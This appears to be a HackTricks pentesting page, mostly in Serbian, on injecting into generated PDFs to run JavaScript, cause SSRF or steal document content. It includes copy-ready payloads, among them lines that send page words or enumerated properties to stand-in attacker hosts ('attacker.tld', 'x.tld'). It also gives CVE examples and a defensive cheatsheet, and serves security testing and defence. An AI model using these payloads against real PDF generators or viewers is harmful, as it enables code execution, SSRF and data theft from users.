# PDF Injection

{{#include ../../banners/hacktricks-training.md}}

**Ako se tvoj input reflektuje unutar PDF fajla, možeš pokušati da injektuješ PDF podatke da bi izvršio JavaScript, izazvao SSRF ili ukrao sadržaj PDF-a.**
PDF sintaksa je ekstremno permisivna – ako možeš da izađeš iz stringa ili dictionary-ja koji ugrađuje tvoj input, možeš dodati potpuno nove objekte (ili nove ključeve u istom objektu) koje će Acrobat/Chrome rado parsirati.
Od 2024. talas bug-bounty izveštaja je pokazao da *jedna ne-escape-ovana zagrada ili back-slash je dovoljna* za potpuno izvršavanje skripte.

## TL;DR – Moderni tok napada (2024-2026)
1. Pronađi bilo koju user-controlled vrednost koja se nađe unutar **(parenthesis string)**, `/URI ( … )` or `/JS ( … )` polja u generisanom PDF-u.
2. Injektuj `) ` (zatvarajući string) praćeno jednim od dole navedenih primitiva i završi sa još jednom otvorenom zagradom da bi sintaksa ostala validna.
3. Dostavi maliciozni PDF žrtvi (ili backend servis koji automatski renderuje fajl – great for blind bugs).
4. Tvoj payload se izvršava u PDF viewer-u:
* Chrome / Edge → PDFium Sandbox
* Firefox → PDF.js (see CVE-2024-4367)
* Acrobat → Full JavaScript API (can exfiltrate arbitrary file contents with `this.getPageNthWord`)

Primer (annotation link hijack):
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
```
*Prva `)` zatvara originalni URI string, zatim dodajemo novi **Action** dictionary koji će Acrobat izvršiti kada korisnik klikne na link.*

## Korisni primitivи za injekciju
| Cilj | Payload Snippet | Napomene |
|------|-----------------|----------|
| **JavaScript on open** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | Izvršava se odmah kada se dokument otvori (radi u Acrobat, ne u Chrome). |
| **JavaScript on link** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | Radi u PDFium & Acrobat ako kontrolišete `/Link` anotaciju. |
| **Blind data exfiltration** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | Kombinujte sa `this.getPageNthWord` unutar JS da biste ukrali sadržaj. |
| **Server-Side SSRF** | Isti kao gore, ali ciljate internu URL adresu – korisno kada PDF renderuju back-office servisi koji poštuju `/URI`. |
| **Additional Actions (/AA)** | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | Prikačite na Page/Annotation/Form dictionary da se pokrene pri otvaranju/fokusu. |
| **Line Break for new objects** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | Ako biblioteka dozvoljava ubacivanje karaktera novog reda, možete kreirati potpuno nove objekte. |

## Ugrađene akcije kao ciljevi za injekciju
PDF preglednici tretiraju **embedded actions** kao prvoklasne funkcije, poput `/OpenAction` i `/AA` (Additional Actions), koje se mogu izvršiti kada se dokument otvori ili kada se dogodi određeni događaj. Ako možete injektovati u bilo koji dictionary koji prihvata akcije (Catalog, Page, Annotation, ili Form field), možete prikačiti `/AA` stablo i okinuti JavaScript pri otvaranju/fokusu.

Primer payload-a za **generator-side object injection** (zatvorite originalni string/dictionary i injektujte `/AA`):
```pdf
) >> /AA << /O << /S /JavaScript /JS (app.alert('AA fired')) >> >> (
```
Ovaj obrazac odgovara nedavnim problemima u jsPDF-u gde ulaz pod kontrolom napadača prosleđen u `addJS` (ili određena AcroForm polja) izlazi iz nameravanog JavaScript stringa i ubacuje **Additional Action** rečnik.

## Blind Enumeration Trick
Gareth Heyes (PortSwigger) je objavio one-liner koji nabraja svaki objekat unutar nepoznatog dokumenta – koristan kada ne možete da vidite generisani PDF:
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
The code iterates over the Acrobat DOM and makes outbound requests for every property/value pair, giving you a *JSON-ish* dump of the file.
See the white-paper “Portable Data **ex**Filtration” for the full technique.

## Real-World Bugs (2023-2026)
* **CVE-2026-25755** – jsPDF `addJS` PDF object injection: attacker-controlled strings can close the JS literal and inject `/AA` → `/O` → `/JavaScript` actions that fire on open/focus.
* **CVE-2024-4367** – Arbitrary JavaScript execution in Firefox’s PDF.js prior to 4.2.67 bypassed the sandbox with a crafted `/JavaScript` action.
* **Bug bounty 2024-05** – Major fintech allowed customer-supplied invoice notes that landed in `/URI`; report paid $10k after demonstrated SSRF to internal metadata host using `file:///` URI.
* **CVE-2023-26155** – `node-qpdf` command-injection via unsanitised PDF path shows the importance of escaping backslashes and parentheses even *before* the PDF layer.

## Defensive Cheatsheet
1. **Never concatenate raw user input** inside `(`…`)` strings or names. Escape `\`, `(`, `)` as required by §7.3 of the PDF spec or use hex strings `<...>`.
2. If you build links, prefer `/URI (https://…)` that you *fully* URL-encode; block `javascript:` schemes in client viewers.
3. Strip or validate `/OpenAction`, `/AA` (additional actions), `/Launch`, `/SubmitForm` and `/ImportData` dictionaries when post-processing PDFs.
4. On the server side, render untrusted PDFs with a *headless converter* (e.g. qpdf –decrypt –linearize) that removes JavaScript and external actions.
5. Keep PDF viewers up to date; PDF.js < 4.2.67 and Acrobat Reader before July 2024 patches allow trivial code execution.
6. If you use client-side generators (e.g., jsPDF), never pass untrusted input into `addJS` or AcroForm setters that end up inside PDF action dictionaries.



## References
* Gareth Heyes, “Portable Data exFiltration – XSS for PDFs”, PortSwigger Research (updated May 2024). <https://portswigger.net/research/portable-data-exfiltration>
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (Apr 2024). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>
* GitLab Advisory Database, “CVE-2026-25755: jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method” (Feb 2026). <https://advisories.gitlab.com/pkg/npm/jspdf/CVE-2026-25755/>
* Adobe Acrobat Help, “Acrobat shows a warning message when signing documents” (Sep 2025) – embedded actions like OpenAction/AA. <https://helpx.adobe.com/acrobat/kb/embedded-action-signing-warning.html>
{{#include ../../banners/hacktricks-training.md}}
